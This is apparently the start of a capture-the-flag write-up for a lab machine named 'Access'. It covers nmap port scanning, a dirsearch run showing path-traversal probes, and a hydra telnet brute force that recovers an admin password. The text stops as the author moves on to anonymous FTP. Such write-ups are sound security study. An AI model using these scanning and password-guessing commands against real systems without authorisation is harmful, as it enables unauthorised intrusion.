## ------------->> Access <<--------------

// We start with nmap scan

    $ nmap -sV -A -Pn -T4 10.10.10.98 -p-
--------

    Nmap scan report for 10.10.10.98
    Host is up (0.20s latency).
    Not shown: 65532 filtered ports
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     Microsoft ftpd
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_Can't get directory listing: PASV failed: 425 Cannot open data connection.
    | ftp-syst: 
    |_  SYST: Windows_NT
    23/tcp open  telnet?
    80/tcp open  http    Microsoft IIS httpd 7.5
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/7.5
    |_http-title: MegaCorp
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

// Navigating to http://10.10.10.98/ represent us only with picture called "out.jpg"

![Image 1]()

// So i tried to search for some interesting directories or files with [dirsearch]()

    $ python3 dirsearch.py -u http://10.10.10.98 -t 100

      _|. _ _  _  _  _ _|_    v0.4.1
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 100 | Wordlist size: 10903

    Target: http://10.10.10.98/

    [11:34:37] Starting: 
    [11:34:41] 403 -  312B  - /%2e%2e//google.com
    [11:34:53] 403 -    2KB - /Trace.axd
    [11:34:54] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
    [11:35:00] 403 -    1KB - /aspnet_client/
    [11:35:00] 301 -  156B  - /aspnet_client  ->  http://10.10.10.98/aspnet_client/
    [11:35:10] 200 -  391B  - /index.html

    Task Completed

// Didnt find there, so i moved on to service 'telnet' on port 23 and tried to brute force 'admin' password(Assumed admin user exist) with [hydra](https://tools.kali.org/password-attacks/hydra) and rockyou.txt

    $ hydra -l admin -P ../../../../wordlists--/rockyou.txt 10.10.10.98 telnet
-------

    $ hydra -l admin -P /wordlists/rockyou.txt 10.10.10.98 telnet
    Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-07 11:52:58
    [WARNING] telnet is by its nature unreliable to analyze, if possible better choose FTP, SSH, etc. if available
    [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
    [DATA] attacking telnet://10.10.10.98:23/
    [STATUS] 62.00 tries/min, 62 tries in 00:01h, 14344337 to do in 3856:01h, 16 active
    [STATUS] 54.43 tries/min, 166 tries in 00:03h, 14344233 to do in 4392:34h, 16 active
    [STATUS] 52.34 tries/min, 369 tries in 00:07h, 14344030 to do in 4567:33h, 16 active
    [STATUS] 51.52 tries/min, 778 tries in 00:15h, 14343621 to do in 4639:52h, 16 active
    [23][telnet] host: 10.10.10.98   login: admin   password: jacob
-------

    admin : jacob

// When tried to connect to telnet with those creds its decline the request, moving on...

// Earlier with nmap scan we could see ther is FTP service open, lets check if we can connect anonymously






